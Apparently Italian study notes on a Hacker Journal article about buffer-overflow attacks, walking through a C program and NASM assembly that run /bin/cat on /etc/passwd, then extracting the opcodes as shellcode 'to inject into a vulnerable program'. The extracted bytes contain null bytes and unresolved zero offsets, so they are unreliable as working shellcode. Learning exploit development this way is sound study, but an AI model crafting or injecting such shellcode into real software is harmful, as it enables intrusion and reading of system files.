#nomeprogetto
###HACKER JOURNAL N.259-pag 42-47###BUFFER OVERFLOW - ATTACCO TRAMITE SHELLCODE###

sudo nano Elenco.c
-------------------------------------
#include <unistd.h>
int main() {
        char *args[3];
        args[0] = "/bin/cat";
        args[1] = "/etc/passwd";
        args[2] = NULL;
        execve(args[0], args, NULL);
}
-------------------------------------
gcc -static -g -o Elenco Elenco.c       //crea eseguibile Elenco
./Elenco

gdb -q Elenco
        disas /rs main
        disas /rs execve

gcc -S -fverbose-asm -g -O2 Elenco.c -o Elenco.s        //si ottiene il file Elenco.s in assembly

sudo nano Elenco_assembly.asm
--------------------------------------------
section .rodata
        align 8
        args dq bin, arg2, 0
        arg2 db "/etc/passwd", 0
        bin db "/bin/cat", 0

section .text
        global _start
        _start:
                mov     rax, 59
                lea     rdi, [rel bin]
                lea     rsi, [rel args]
                xor     edx, edx
                syscall
--------------------------------------------
nasm -f elf64 Elenco_assembly.asm               //assemblatore NASM=netwide assembler, crea un file Elenco_assembly.o

ld -o Elenco_assembly Elenco_assembly.o         //crea eseguibile Elenco_assembly che da lo stesso risultato dell'eseguibile ./Elenco

objdump -d elenco_assembly.o -M intel           //fornisce il disassemblato del codice con gli opcode corrispondenti

for i in $(objdump -d Elenco_assembly.o -M intel | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo  //fornisce l'estrazione del codice per la shellcode

\xb8\x3b\x00\x00\x00\x48\x8d\x3d\x00\x00\x00\x00\x48\x8d\x35\x00\x00\x00\x00\x31\xd2\x0f\x05            //shellcode da iniettare a un programma vulnerabile
